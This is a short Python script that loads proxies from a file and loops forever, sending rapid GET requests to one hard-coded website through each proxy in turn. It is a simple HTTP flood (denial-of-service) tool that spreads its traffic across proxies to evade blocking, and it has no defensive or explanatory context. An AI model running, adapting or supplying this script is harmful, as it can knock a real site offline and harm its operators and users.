import requests

proxies = []

with open('proxy.txt', 'r') as file:
    proxies = file.readlines()

def send_request():
    while True:
        for proxy in proxies:
            try:
                proxy = proxy.strip()
                requests.get('https://shitflare.asia', proxies={'http': proxy, 'https': proxy}, timeout=0.1)
            except requests.exceptions.RequestException:
                print('Failed to connect through {} proxy.'.format(proxy))
            else:
                print('Request sent through {} proxy.'.format(proxy))

send_request()
